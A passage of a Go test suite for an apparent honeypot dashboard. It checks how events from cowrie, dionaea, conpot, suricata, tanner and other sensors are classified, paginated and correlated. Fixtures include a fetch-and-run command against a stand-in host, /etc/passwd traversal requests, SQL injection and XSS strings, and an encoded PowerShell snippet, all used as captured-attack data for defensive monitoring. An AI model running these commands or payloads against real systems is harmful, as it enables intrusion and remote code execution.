package main

import (
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"html/template"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestEventPaginationAndAttackerProfile(t *testing.T) {
	s := &store{}
	for i := 0; i < 205; i++ {
		s.events = append(s.events, storedEvent{SrcIP: "203.0.113.9", Sensor: "cowrie", Session: "session-a", Command: "id", Shasum: "abc", Time: "2026-07-22 01:00"})
	}
	request := httptest.NewRequest("GET", "/events?ip=203.0.113.9&page=2&per_page=100", nil)
	page := s.eventsData(request)
	if page.Page != 2 || page.Pages != 3 || page.From != 101 || page.To != 200 || len(page.Events) != 100 || page.PrevURL == "" || page.NextURL == "" {
		t.Fatalf("unexpected event page: %+v", page)
	}
	profile, ok := s.attackerData("203.0.113.9")
	if !ok || profile.Total != 205 || profile.Sessions != 1 || profile.PayloadCount != 205 || len(profile.Events) != 250 && len(profile.Events) != 205 {
		t.Fatalf("unexpected attacker profile: %+v", profile)
	}
}

func TestAttackerProfileFingerprints(t *testing.T) {
	s := &store{events: []storedEvent{
		{SrcIP: "203.0.113.9", Sensor: "dionaea", Fingerprint: "Linux 3.11 and newer", FingerKind: "p0f OS", Time: "2026-08-01 01:00"},
		{SrcIP: "203.0.113.9", Sensor: "dionaea", Fingerprint: "Linux 3.11 and newer", FingerKind: "p0f OS", Time: "2026-08-01 01:01"},
		{SrcIP: "203.0.113.9", Sensor: "cowrie", Fingerprint: "abc123", FingerKind: "JA3", Time: "2026-08-01 01:02"},
		{SrcIP: "203.0.113.9", Sensor: "cowrie", Time: "2026-08-01 01:03"},
	}}
	profile, ok := s.attackerData("203.0.113.9")
	if !ok || len(profile.Fingerprints) != 2 {
		t.Fatalf("unexpected fingerprint aggregation: %+v", profile.Fingerprints)
	}
	byKey := map[string]kv{}
	for _, f := range profile.Fingerprints {
		byKey[f.Title] = f
	}
	p0f, ok := byKey["Linux 3.11 and newer"]
	if !ok || p0f.Count != 2 || p0f.Key != "p0f OS: Linux 3.11 and newer" || p0f.Link != "/events?fingerprint=Linux+3.11+and+newer" {
		t.Fatalf("unexpected p0f fingerprint entry: %+v", p0f)
	}
	ja3, ok := byKey["abc123"]
	if !ok || ja3.Count != 1 || ja3.Key != "JA3: abc123" || ja3.Link != "/events?fingerprint=abc123" {
		t.Fatalf("unexpected JA3 fingerprint entry: %+v", ja3)
	}
}

func TestEventExplorerDefaultsToLazyWindow(t *testing.T) {
	s := &store{}
	for i := 0; i < 60; i++ {
		s.events = append(s.events, storedEvent{SrcIP: "203.0.113.10", Sensor: "cowrie"})
	}
	page := s.eventsData(httptest.NewRequest("GET", "/events", nil))
	if page.Total != 60 || len(page.Events) != 25 || page.PerPage != 25 ||
		page.Offset != 0 || page.RowsURL != "/api/event-rows" {
		t.Fatalf("unexpected initial lazy event window: %+v", page)
	}
	page = s.eventsData(httptest.NewRequest("GET", "/events?page=2", nil))
	if len(page.Events) != 25 || page.Offset != 25 || page.From != 26 || page.To != 50 {
		t.Fatalf("unexpected second event window: %+v", page)
	}
}

func TestSessionReplayAndTechniqueMapping(t *testing.T) {
	now := time.Now()
	s := &store{events: []storedEvent{
		{when: now, Time: now.Format(time.RFC3339), SrcIP: "203.0.113.9", Sensor: "cowrie", Session: "session-a", Command: "curl http://bad.example/p | bash", Detail: "command"},
		{when: now.Add(-time.Minute), Time: now.Add(-time.Minute).Format(time.RFC3339), SrcIP: "203.0.113.9", Sensor: "cowrie", Session: "session-a", User: "root", Pass: "root", IsLogin: true, HasCredential: true, Detail: "login"},
	}}
	page, ok := s.sessionData("session-a")
	if !ok || page.Total != 2 || len(page.Commands) != 1 || len(page.Credentials) != 1 || len(page.Techniques) < 3 {
		t.Fatalf("incomplete session replay: %+v", page)
	}
	if page.Events[0].Detail != "login" || page.Events[1].Detail != "command" {
		t.Fatalf("session is not chronological: %+v", page.Events)
	}
	ids := map[string]bool{}
	for _, item := range page.Techniques {
		ids[item.ID] = true
	}
	for _, want := range []string{"T1110", "T1059.004", "T1105"} {
		if !ids[want] {
			t.Fatalf("missing technique %s: %+v", want, page.Techniques)
		}
	}
}

func TestInfrastructureClustersRequireSharedSources(t *testing.T) {
	s := &store{events: []storedEvent{
		{SrcIP: "8.8.8.8", Sensor: "cowrie", Fingerprint: "shared-hassh", ASN: 15169, Org: "Google"},
		{SrcIP: "8.8.4.4", Sensor: "dionaea", Fingerprint: "shared-hassh", ASN: 15169, Org: "Google"},
		{SrcIP: "1.1.1.1", Sensor: "cowrie", Fingerprint: "single"},
	}}
	page := s.clustersData(filter{})
	if len(page.Rows) < 2 {
		t.Fatalf("expected fingerprint and ASN clusters: %+v", page.Rows)
	}
	for _, row := range page.Rows {
		if row.Value == "single" {
			t.Fatalf("single-source value was clustered: %+v", row)
		}
	}
}

func TestPortbridgeIsCorrelationOnly(t *testing.T) {
	ev := classify(map[string]any{
		"sensor":   "portbridge",
		"event":    "connect",
		"src_ip":   "203.0.113.10",
		"via_port": float64(12345),
	}, "portbridge")
	if !ev.skip {
		t.Fatal("portbridge record was classified as a dashboard event")
	}
}

// TestTarpittedHTTPRequestSurfacesDurationAndBytes covers #246: http-honeypot/
// api-honeypot's tarpit response is only worth anything if an operator can
// see it happened, not just that a "scan" request was logged normally.
func TestTarpittedHTTPRequestSurfacesDurationAndBytes(t *testing.T) {
	ev := classify(map[string]any{
		"sensor":       "http-honeypot",
		"method":       "GET",
		"path":         "/this-matches-nothing",
		"category":     "scan",
		"tarpitted":    true,
		"tarpit_ms":    float64(4200),
		"tarpit_bytes": float64(6144),
	}, "http-honeypot")
	if !strings.Contains(ev.detail, "tarpitted") {
		t.Fatalf("detail must mention the tarpit outcome, got %q", ev.detail)
	}
	if !strings.Contains(ev.detail, "4200ms") || !strings.Contains(ev.detail, "6.0KB") {
		t.Fatalf("detail must include duration and size, got %q", ev.detail)
	}
}

func TestNonTarpittedHTTPRequestHasNoTarpitDetail(t *testing.T) {
	ev := classify(map[string]any{
		"sensor":   "http-honeypot",
		"method":   "GET",
		"path":     "/wp-login.php",
		"category": "wordpress",
	}, "http-honeypot")
	if strings.Contains(ev.detail, "tarpit") {
		t.Fatalf("a normally-answered request must not mention tarpitting, got %q", ev.detail)
	}
}

func TestEndlesshDisconnectSurfacesHeldDurationAndLineCount(t *testing.T) {
	ev := classify(map[string]any{
		"sensor":  "endlessh",
		"event":   "disconnect",
		"port":    float64(2222),
		"held_ms": float64(45231),
		"lines":   float64(4),
	}, "endlessh")
	if ev.sensor != "endlessh" || ev.proto != "ssh" {
		t.Fatalf("sensor/proto = %q/%q, want endlessh/ssh", ev.sensor, ev.proto)
	}
	if !strings.Contains(ev.detail, "45231ms") || !strings.Contains(ev.detail, "4 banner lines") {
		t.Fatalf("detail must include held duration and line count, got %q", ev.detail)
	}
}

func TestEndlesshListeningEventIsSkipped(t *testing.T) {
	ev := classify(map[string]any{"sensor": "endlessh", "event": "listening"}, "endlessh")
	if !ev.skip {
		t.Fatal("a bare startup-announcement event must be skipped, not shown as attacker activity")
	}
}

func TestBalancedRecentLimitsNoisySensor(t *testing.T) {
	evs := []storedEvent{
		{Sensor: "cowrie", Detail: "c1"},
		{Sensor: "cowrie", Detail: "c2"},
		{Sensor: "cowrie", Detail: "c3"},
		{Sensor: "dionaea", Detail: "d1"},
		{Sensor: "conpot", Detail: "p1"},
	}

	got := balancedRecent(evs, 4, 2)
	if len(got) != 4 {
		t.Fatalf("got %d rows, want 4", len(got))
	}
	want := []string{"c1", "c2", "d1", "p1"}
	for i := range want {
		if got[i].Detail != want[i] {
			t.Fatalf("row %d = %q, want %q", i, got[i].Detail, want[i])
		}
	}
}

func TestDionaeaIncidentIsNormalized(t *testing.T) {
	raw := map[string]any{
		"origin": "dionaea.download.complete",
		"data": map[string]any{
			"connection": map[string]any{
				"protocol":    "smbd",
				"remote_ip":   tunnelPeerIP,
				"remote_port": float64(45678),
				"local_port":  float64(445),
			},
			"path":   "/opt/dionaea/var/lib/dionaea/binaries/0123456789abcdef0123456789abcdef",
			"sha256": "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
		},
	}

	ev := classify(raw, "dionaea")
	if ev.skip || ev.sensor != "dionaea" || ev.proto != "smbd" || ev.port != "445" {
		t.Fatalf("unexpected normalized incident: %+v", ev)
	}
	if ev.shasum == "" || ev.download == "" {
		t.Fatalf("payload fields missing: %+v", ev)
	}
	if got := eventSrcPort(raw); got != 45678 {
		t.Fatalf("eventSrcPort = %d, want 45678", got)
	}
}

func TestConpotPersonaKeepsSensorIdentity(t *testing.T) {
	ev := classify(map[string]any{"data_type": "s7comm", "dst_port": float64(102)}, "conpot-s7-1500")
	if ev.sensor != "conpot-s7-1500" || ev.proto != "s7comm" || ev.port != "2102" {
		t.Fatalf("unexpected conpot persona: %+v", ev)
	}
}

// TestConpotSurfacesDeviceResponse is a regression test found via a live ES
// document: conpot logs both "request" and "response" (the fake device's
// own reply bytes -- what was actually disclosed to the attacker), but only
// request ever reached the dashboard row.
func TestConpotSurfacesDeviceResponse(t *testing.T) {
	ev := classify(map[string]any{
		"data_type": "kamstrup_protocol", "dst_port": float64(1025),
		"request": "b'01000d'", "response": "b'403f10001bf202044402668be5e6e00d'",
	}, "conpot-kamstrup")
	if !strings.Contains(ev.detail, "b'01000d'") {
		t.Fatalf("request not surfaced in detail: %q", ev.detail)
	}
	if !strings.Contains(ev.detail, "403f10001bf202044402668be5e6e00d") {
		t.Fatalf("device response not surfaced in detail: %q", ev.detail)
	}
}

// TestConpotRequestDoesNotPolluteTopCommands (#41): a live production check
// found raw industrial-protocol bytes -- and once, an entire raw HTTP
// request plus a PROXY-protocol preamble a scanner happened to send to a
// conpot port -- in the Attacker Behavior tab's Top Commands list. conpot's
// "request" is never an attacker-issued shell command; it must not reach
// ev.command (which feeds aggregate.go's commands[sensor+cmd]++
// leaderboard), only ev.detail.
func TestConpotRequestDoesNotPolluteTopCommands(t *testing.T) {
	ev := classify(map[string]any{
		"data_type": "modbus", "dst_port": float64(502),
		"request": "PROXY TCP4 198.51.100.7 203.0.113.50 39572 50100\r\nGET /../../etc/passwd HTTP/1.1\r\n",
	}, "conpot")
	if ev.command != "" {
		t.Fatalf("conpot request must not populate ev.command (pollutes Top Commands), got %q", ev.command)
	}
}

// TestClassifySuricataSurfacesPrintablePayload is a regression test for
// #576: vps/suricata/suricata.yaml enables payload-printable/http-body-
// printable (safe, already-sanitized capture of the bytes that triggered a
// signature match), which reaches Elasticsearch intact but was never read
// here -- an operator saw which signature matched, not what matched it.
func TestClassifySuricataSurfacesPrintablePayload(t *testing.T) {
	withPayload := classify(map[string]any{
		"event_type": "alert", "proto": "TCP", "dest_port": float64(445),
		"alert":             map[string]any{"signature": "ET SCAN Suspicious", "category": "scan", "severity": float64(2)},
		"payload_printable": "GET /../../etc/passwd HTTP/1.1",
	}, "suricata")
	if !strings.Contains(withPayload.detail, "GET /../../etc/passwd HTTP/1.1") {
		t.Fatalf("payload_printable not surfaced in detail: %q", withPayload.detail)
	}
	// #41's reasoning applies here too: arbitrary matched network content is
	// not an attacker-issued command and must not pollute Top Commands.
	if withPayload.command != "" {
		t.Fatalf("suricata payload must not populate ev.command (pollutes Top Commands), got %q", withPayload.command)
	}

	withBody := classify(map[string]any{
		"event_type": "alert", "proto": "TCP", "dest_port": float64(80),
		"alert": map[string]any{"signature": "ET WEB_SERVER Exploit", "category": "web-application-attack", "severity": float64(1)},
		"http":  map[string]any{"http_body_printable": "<script>alert(1)</script>"},
	}, "suricata")
	if !strings.Contains(withBody.detail, "<script>alert(1)</script>") {
		t.Fatalf("http_body_printable not surfaced in detail: %q", withBody.detail)
	}

	// Most alerts won't carry either field -- must not break existing
	// signature/category/severity handling.
	plain := classify(map[string]any{
		"event_type": "alert", "proto": "TCP", "dest_port": float64(22),
		"alert": map[string]any{"signature": "ET SCAN SSH Scan", "category": "scan", "severity": float64(3)},
	}, "suricata")
	if plain.alert != "ET SCAN SSH Scan" || plain.category != "scan" || plain.severity != 3 {
		t.Fatalf("existing alert fields regressed: %+v", plain)
	}
	if !strings.Contains(plain.detail, "ET SCAN SSH Scan") || strings.Contains(plain.detail, "payload:") || strings.Contains(plain.detail, "body:") {
		t.Fatalf("plain alert detail unexpectedly changed: %q", plain.detail)
	}
}

// TestClassifySuricataSurfacesSeverityAndMITRE uses the exact alert.metadata
// shape confirmed live against real eve.json on the VPS (#615): severity is
// carried into ev.severity/storedEvent but was never rendered anywhere, and
// mitre_tactic_id/mitre_technique_id (present on most ET/OISF rules that
// map to ATT&CK) were never read at all.
func TestClassifySuricataSurfacesSeverityAndMITRE(t *testing.T) {
	ev := classify(map[string]any{
		"event_type": "alert", "proto": "TCP", "dest_port": float64(445),
		"alert": map[string]any{
			"signature": "ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement",
			"category":  "Potentially Bad Traffic",
			"severity":  float64(2),
			"metadata": map[string]any{
				"mitre_tactic_id":      []any{"TA0008"},
				"mitre_tactic_name":    []any{"Lateral_Movement"},
				"mitre_technique_id":   []any{"T1021"},
				"mitre_technique_name": []any{"Remote_Services"},
			},
		},
	}, "suricata")
	if ev.severity != 2 {
		t.Fatalf("severity = %d, want 2", ev.severity)
	}
	if !strings.Contains(ev.detail, "severity 2") {
		t.Fatalf("severity label missing from detail: %q", ev.detail)
	}
	if !strings.Contains(ev.detail, "TA0008") || !strings.Contains(ev.detail, "Lateral_Movement") ||
		!strings.Contains(ev.detail, "T1021") || !strings.Contains(ev.detail, "Remote_Services") {
		t.Fatalf("MITRE ATT&CK context missing from detail: %q", ev.detail)
	}
}

// TestClassifySuricataMITRESuffixAbsentWithoutMetadata confirms alerts with
// no metadata block (most rules don't carry MITRE mappings) don't get a
// stray "ATT&CK:" suffix or panic on the missing field.
func TestClassifySuricataMITRESuffixAbsentWithoutMetadata(t *testing.T) {
	ev := classify(map[string]any{
		"event_type": "alert", "proto": "TCP", "dest_port": float64(22),
		"alert": map[string]any{"signature": "ET SCAN SSH Scan", "category": "scan", "severity": float64(3)},
	}, "suricata")
	if strings.Contains(ev.detail, "ATT&CK") {
		t.Fatalf("unexpected ATT&CK suffix with no metadata: %q", ev.detail)
	}
}

// TestClassifySuricataSurfacesAnomalyEvent is a regression test for #616:
// et != "alert" dropped anomaly events (protocol-conformance violations,
// potentially IDS evasion) along with the genuinely high-volume flow/dns/
// netflow types, even though anomaly is low-volume and security-relevant.
// Uses the exact anomaly shape confirmed live against real eve.json on the
// VPS.
func TestClassifySuricataSurfacesAnomalyEvent(t *testing.T) {
	ev := classify(map[string]any{
		"event_type": "anomaly", "proto": "TCP", "dest_port": float64(54078),
		"anomaly": map[string]any{
			"app_proto": "http", "type": "applayer",
			"event": "REQUEST_HEADER_REPETITION", "layer": "proto_parser",
		},
	}, "suricata")
	if ev.skip {
		t.Fatal("anomaly event was skipped, want it surfaced")
	}
	if !strings.Contains(ev.detail, "REQUEST_HEADER_REPETITION") || !strings.Contains(ev.detail, "http") ||
		!strings.Contains(ev.detail, "proto_parser") {
		t.Fatalf("anomaly detail incomplete: %q", ev.detail)
	}
	// #1279: anomalyEvent/anomalyAppProto must be their own fields (not
	// only baked into ev.detail text) so the trend chart can group by them
	// directly instead of parsing them back out.
	if ev.anomalyEvent != "REQUEST_HEADER_REPETITION" || ev.anomalyAppProto != "http" {
		t.Fatalf("anomalyEvent/anomalyAppProto = %q/%q, want REQUEST_HEADER_REPETITION/http", ev.anomalyEvent, ev.anomalyAppProto)
	}
}

// TestClassifySuricataDropsHighVolumeNonAlertTypes confirms flow/dns/
// netflow are still filtered -- #616 only exempts anomaly, not every type.
func TestClassifySuricataDropsHighVolumeNonAlertTypes(t *testing.T) {
	for _, et := range []string{"flow", "dns", "netflow", "stats"} {
		ev := classify(map[string]any{"event_type": et}, "suricata")
		if !ev.skip {
			t.Errorf("event_type %q was not skipped, want skip", et)
		}
	}
}

// TestClassifyDNP3SurfacesLinkFunctionAndAddresses is a regression test for
// #570: dnp3-honeypot emits function/dnp3_source/dnp3_destination on every
// real frame, but classify.go had no dedicated dnp3 case at all -- every
// event fell through to the generic fallback, which only ever showed the
// bare event field ("frame") with no link function or RTU address.
func TestClassifyDNP3SurfacesLinkFunctionAndAddresses(t *testing.T) {
	frame := classify(map[string]any{
		"sensor": "dnp3", "event": "frame", "port": float64(20000),
		"function":    "confirmed_user_data",
		"dnp3_source": float64(4), "dnp3_destination": float64(1),
	}, "dnp3")
	if frame.sensor != "dnp3" || frame.proto != "dnp3" || frame.port != "20000" {
		t.Fatalf("unexpected dnp3 frame classification: %+v", frame)
	}
	if !strings.Contains(frame.detail, "confirmed_user_data") {
		t.Fatalf("link function not surfaced: %q", frame.detail)
	}
	if !strings.Contains(frame.detail, "src 4") || !strings.Contains(frame.detail, "dst 1") {
		t.Fatalf("dnp3 source/destination addresses not surfaced: %q", frame.detail)
	}

	// #610: app_function (application-layer function code, only present on
	// frames carrying a full transport+app-layer segment) must surface too.
	withApp := classify(map[string]any{
		"sensor": "dnp3", "event": "frame", "port": float64(20000),
		"function": "unconfirmed_user_data", "app_function": "operate",
		"dnp3_source": float64(4), "dnp3_destination": float64(1),
	}, "dnp3")
	if !strings.Contains(withApp.detail, "app operate") {
		t.Fatalf("app_function not surfaced: %q", withApp.detail)
	}

	malformed := classify(map[string]any{
		"sensor": "dnp3", "event": "malformed_frame", "port": float64(20000),
	}, "dnp3")
	if malformed.detail != "malformed frame" {
		t.Fatalf("malformed frame not labeled distinctly: %q", malformed.detail)
	}
	if malformed.detail == frame.detail {
		t.Fatalf("malformed frame and normal frame produced identical detail")
	}
}

// TestClassifyDNSHoneypotSurfacesDroppedResponse is a regression test for
// #571: dns-honeypot's own anti-amplification cap (dns.go's ratioCap) can
// suppress a response entirely and marks that by appending "_dropped" to
// the logged event ("query_dropped") -- a real, already-in-ES signal that
// classify.go never surfaced, making a capped response indistinguishable
// from a normally-answered one.
func TestClassifyDNSHoneypotSurfacesDroppedResponse(t *testing.T) {
	answered := classify(map[string]any{
		"sensor": "dns-honeypot", "event": "query", "query": "example.com.", "qtype": float64(1),
	}, "dns-honeypot")
	if strings.Contains(answered.detail, "suppressed") {
		t.Fatalf("a normally-answered query must not be marked suppressed: %q", answered.detail)
	}

	dropped := classify(map[string]any{
		"sensor": "dns-honeypot", "event": "query_dropped", "query": "example.com.", "qtype": float64(1),
	}, "dns-honeypot")
	if !strings.Contains(dropped.detail, "suppressed") {
		t.Fatalf("a dropped response was not marked distinctly: %q", dropped.detail)
	}
	if dropped.detail == answered.detail {
		t.Fatalf("dropped and answered queries produced identical detail")
	}

	// The suffix check must also catch malformed_query_dropped, not just
	// query_dropped -- dns-honeypot appends "_dropped" to whatever event
	// value it already had (main.go's e.Event += "_dropped").
	malformedDropped := classify(map[string]any{
		"sensor": "dns-honeypot", "event": "malformed_query_dropped",
	}, "dns-honeypot")
	if !strings.Contains(malformedDropped.detail, "suppressed") {
		t.Fatalf("a dropped malformed query was not marked distinctly: %q", malformedDropped.detail)
	}
}

// TestClassifyTannerSurfacesDetectionName is a regression test found via a
// live ES document: tanner's own emulator classifies every request
// (response_msg.response.message.detection.name), but this was never read
// at all -- a real attack signature match was indistinguishable from benign
// traffic in the dashboard.
func TestClassifyTannerSurfacesDetectionName(t *testing.T) {
	benign := classify(map[string]any{
		"method": "GET", "path": "/", "sensor": "tanner",
		"response_msg": map[string]any{"response": map[string]any{"message": map[string]any{
			"detection": map[string]any{"name": "index"},
		}}},
	}, "tanner")
	if strings.Contains(benign.detail, "[") {
		t.Fatalf("benign 'index' detection should not clutter detail: %q", benign.detail)
	}

	attack := classify(map[string]any{
		"method": "GET", "path": "/shell.php", "sensor": "tanner",
		"response_msg": map[string]any{"response": map[string]any{"message": map[string]any{
			"detection": map[string]any{"name": "php_code_injection"},
		}}},
	}, "tanner")
	if !strings.Contains(attack.detail, "php_code_injection") {
		t.Fatalf("attack detection name not surfaced: %q", attack.detail)
	}
	if attack.category != "tanner: php_code_injection" {
		t.Fatalf("category = %q, want tanner: php_code_injection", attack.category)
	}
}

// TestClassifyTannerSurfacesPostDataAndCookies is a regression test for
// #575: tanner's session log carries the actual payload (post_data) and
// cookies for a classified attack -- exactly where a SQLi/XSS/cmd_exec/
// php_object_injection/etc. payload lands once one of tanner's emulators
// matches -- but classify.go never read either, so an operator saw the
// detection name with no evidence of what triggered it.
func TestClassifyTannerSurfacesPostDataAndCookies(t *testing.T) {
	attack := classify(map[string]any{
		"method": "POST", "path": "/login", "sensor": "tanner",
		"post_data": map[string]any{"username": "admin' OR '1'='1", "password": "x"},
		"cookies":   map[string]any{"PHPSESSID": "' UNION SELECT NULL--"},
		"response_msg": map[string]any{"response": map[string]any{"message": map[string]any{
			"detection": map[string]any{"name": "sqli"},
		}}},
	}, "tanner")
	if !strings.Contains(attack.command, "username=admin' OR '1'='1") {
		t.Fatalf("post_data payload not surfaced in ev.command: %q", attack.command)
	}
	if !strings.Contains(attack.detail, "payload:") {
		t.Fatalf("detail should carry the payload label: %q", attack.detail)
	}
	if !strings.Contains(attack.detail, "PHPSESSID=' UNION SELECT NULL--") {
		t.Fatalf("cookies not surfaced in detail: %q", attack.detail)
	}

	// A benign ("index") request must not surface post_data/cookies -- only
	// a classified attack should, matching the existing detection-name gate.
	benign := classify(map[string]any{
		"method": "POST", "path": "/", "sensor": "tanner",
		"post_data": map[string]any{"q": "search term"},
		"response_msg": map[string]any{"response": map[string]any{"message": map[string]any{
			"detection": map[string]any{"name": "index"},
		}}},
	}, "tanner")
	if benign.command != "" || strings.Contains(benign.detail, "payload:") {
		t.Fatalf("benign 'index' detection should not surface post_data, got command=%q detail=%q", benign.command, benign.detail)
	}

	// http-honeypot's own POST handling captures its body separately via
	// e["body"] -- post_data/cookies must stay scoped to tanner only, even
	// if a future http-honeypot record happened to carry a same-shaped key.
	httpEvent := classify(map[string]any{
		"method": "POST", "path": "/wp-login.php", "sensor": "http-honeypot",
		"post_data": map[string]any{"user": "admin"},
	}, "http-honeypot")
	if httpEvent.command != "" {
		t.Fatalf("http-honeypot must not read post_data (tanner-only), got command=%q", httpEvent.command)
	}
}

// TestClassifyTannerSurfacesEmulationResult is a regression test for #618:
// detection.payload.value -- the actual emulator execution result
// (cmd_exec's real shell stdout, lfi's real file-read content, etc.) --
// reached ES unmodified but was never read here at all, the richest field
// tanner produces.
func TestClassifyTannerSurfacesEmulationResult(t *testing.T) {
	attack := classify(map[string]any{
		"method": "GET", "path": "/cgi-bin/test.cgi", "sensor": "tanner",
		"response_msg": map[string]any{"response": map[string]any{"message": map[string]any{
			"detection": map[string]any{
				"name": "cmd_exec",
				"payload": map[string]any{
					"value": "uid=0(root) gid=0(root) groups=0(root)\n",
					"page":  true,
				},
			},
		}}},
	}, "tanner")
	if !strings.Contains(attack.detail, "result:") || !strings.Contains(attack.detail, "uid=0(root)") {
		t.Fatalf("emulation result not surfaced in detail: %q", attack.detail)
	}

	// Benign/"index" traffic, and any classified attack whose emulator
	// didn't run (no "payload" key at all), must not show a stray "result:"
	// label with nothing behind it.
	noPayload := classify(map[string]any{
		"method": "GET", "path": "/", "sensor": "tanner",
		"response_msg": map[string]any{"response": map[string]any{"message": map[string]any{
			"detection": map[string]any{"name": "xss"},
		}}},
	}, "tanner")
	if strings.Contains(noPayload.detail, "result:") {
		t.Fatalf("unexpected 'result:' label with no payload: %q", noPayload.detail)
	}
}

func TestCampaignCorrelationByNetwork(t *testing.T) {
	now := time.Now()
	evs := []storedEvent{
		{when: now, SrcIP: "8.8.8.8", Sensor: "cowrie", Port: "22", User: "root", Pass: "root", IsLogin: true},
		{when: now.Add(-time.Minute), SrcIP: "8.8.8.9", Sensor: "conpot-s7-1200", Port: "1102", Alert: "S7 scan"},
		{when: now.Add(-8 * 24 * time.Hour), SrcIP: "8.8.8.10", Sensor: "cowrie", Port: "22"},
	}
	rows := correlateCampaigns(evs, now.Add(-7*24*time.Hour))
	if len(rows) != 1 {
		t.Fatalf("got %d campaigns, want 1", len(rows))
	}
	got := rows[0]
	if got.CIDR != "8.8.8.0/24" || got.Events != 2 || got.UniqueIPs != 2 || got.Creds != 1 || got.Alerts != 1 {
		t.Fatalf("unexpected campaign: %+v", got)
	}
	if !strings.Contains(got.Link, "cidr=8.8.8.0%2F24") {
		t.Fatalf("campaign link lacks CIDR filter: %s", got.Link)
	}
}

func TestFeedState(t *testing.T) {
	now := time.Now()
	for _, tc := range []struct {
		last time.Time
		want string
	}{{time.Time{}, "waiting"}, {now.Add(-time.Minute), "active"}, {now.Add(-time.Hour), "quiet"}, {now.Add(-48 * time.Hour), "stale"}} {
		if got := feedState(tc.last, now); got != tc.want {
			t.Fatalf("feedState(%v) = %q, want %q", tc.last, got, tc.want)
		}
	}
}

func TestAPIHoneypotKeepsSensorIdentity(t *testing.T) {
	ev := classify(map[string]any{
		"time": "2026-07-20T19:10:15Z", "sensor": "api-honeypot",
		"src_ip": "8.8.8.8", "method": "GET", "path": "/v1/models", "category": "llm-api",
	}, "api-honeypot")
	if ev.sensor != "api-honeypot" || ev.category != "llm-api" {
		t.Fatalf("unexpected API event: %+v", ev)
	}
}

func TestProviderClassification(t *testing.T) {
	if got := providerType("Amazon.com, Inc."); got != "cloud" {
		t.Fatalf("Amazon provider type = %q", got)
	}
	if got := providerType("Censys, Inc."); got != "scanner" {
		t.Fatalf("Censys provider type = %q", got)
	}
}

func TestDionaeaConnectionDeduplication(t *testing.T) {
	when := time.Unix(100, 0)
	a := event{sensor: "dionaea", ip: "8.8.8.8", port: "445", proto: "smb", detail: "connection.free", when: when}
	b := event{sensor: "dionaea", ip: "8.8.8.8", port: "445", proto: "smb", detail: "smb/tcp accept", when: when.Add(time.Second)}
	if dedupeKey(a) != dedupeKey(b) {
		t.Fatalf("equivalent Dionaea connection records were not deduplicated")
	}
}

func TestPayloadStaticAnalysis(t *testing.T) {
	dir := t.TempDir()
	name := strings.Repeat("a", 64)
	content := []byte("MZ.... powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAdABlAHMAdAAnAA== https%3A%2F%2Fexample.invalid")
	if err := os.WriteFile(filepath.Join(dir, name), content, 0o600); err != nil {
		t.Fatal(err)
	}
	a, err := (&store{payloadDirs: []string{dir}}).analyzePayload(name)
	if err != nil {
		t.Fatal(err)
	}
	if a.SHA256 == "" || a.Hexdump == "" || len(a.Decoded) == 0 {
		t.Fatalf("incomplete static analysis: %+v", a)
	}
}

// Dionaea keeps its own on-disk naming convention (MD5), unrelated to this
// pipeline -- a request for a capture's SHA-256 (the hash GitHub-analysis's
// own reports and every other source use) never matches by filename alone.
// /payload-analysis/{sha256} 404ing for exactly this case was reported live
// (#255): a real Dionaea capture's GitHub-analysis "static analysis" link
// carried its SHA-256, but the file on disk is named by its MD5.
func TestPayloadStaticAnalysisFindsDionaeaCaptureBySHA256(t *testing.T) {
	dir := t.TempDir()
	content := []byte("MZ fake PE content for a Dionaea-style capture")
	sum := sha256.Sum256(content)
	sha256hex := hex.EncodeToString(sum[:])
	md5sum := md5.Sum(content)
	md5name := hex.EncodeToString(md5sum[:])

	if err := os.WriteFile(filepath.Join(dir, md5name), content, 0o600); err != nil {
		t.Fatal(err)
	}

	s := &store{payloadDirs: []string{dir}}
	if _, err := s.analyzePayload(sha256hex); err != nil {
		t.Fatalf("lookup by SHA-256 for an MD5-named Dionaea capture failed: %v", err)
	}

	// A request that names nothing real must still 404, not scan forever or
	// return an unrelated file.
	if _, err := s.analyzePayload(strings.Repeat("f", 64)); err == nil {
		t.Fatal("lookup for a hash that matches no file should fail, not silently succeed")
	}
}

func TestPayloadInventoryIncludesEverySourceAndNestedArtifact(t *testing.T) {
	root := t.TempDir()
	dionaea := filepath.Join(root, "dionaea", "binaries")
	cowrie := filepath.Join(root, "cowrie-downloads")
	scripts := filepath.Join(root, "script-payloads", "nested")
	for _, dir := range []string{dionaea, cowrie, scripts} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	shared := strings.Repeat("a", 64)
	script := strings.Repeat("b", 64)
	for _, path := range []string{filepath.Join(dionaea, shared), filepath.Join(cowrie, shared), filepath.Join(scripts, script)} {
		if err := os.WriteFile(path, []byte(path), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	// #1223: scanPayloads (the disk walk that used to build payloadCache
	// here) moved to payload-inventory-worker -- payloadsData's own dedup/
	// multi-source/filter logic is what this test actually verifies, so
	// payloadCache is built directly instead, matching what a real scan
	// would have produced from the files written above. The files
	// themselves stay real and on disk: payloadPath's own disk-search
	// fallback (checked below) is unaffected by #1223 and still needs them.
	s := &store{payloadDirs: []string{dionaea, cowrie, filepath.Dir(scripts)}}
	s.payloadCache = payloadsPage{
		Enabled: true, UniqueTotal: 2,
		Files: []capturedFile{
			{Hash: shared, Copies: 2, Sources: []string{"cowrie", "dionaea"}},
			{Hash: script, Copies: 1, Sources: []string{"scripts"}},
		},
		Sources: []payloadSourceStat{
			{Name: "cowrie", Count: 1}, {Name: "dionaea", Count: 1}, {Name: "scripts", Count: 1},
		},
	}
	s.payloadCacheAt = time.Now()
	page := s.payloadsData(payloadsFilter{})
	if page.UniqueTotal != 2 || page.ResultTotal != 2 || len(page.Files) != 2 || len(page.Sources) != 3 {
		t.Fatalf("unexpected unified inventory: %+v", page)
	}
	for _, file := range page.Files {
		if file.Hash == shared && (file.Copies != 2 || strings.Join(file.Sources, ",") != "cowrie,dionaea") {
			t.Fatalf("shared payload did not retain both sources: %+v", file)
		}
	}
	filtered := s.payloadsData(payloadsFilter{Source: "cowrie"})
	if filtered.ResultTotal != 1 || len(filtered.Files) != 1 || filtered.Files[0].Hash != shared {
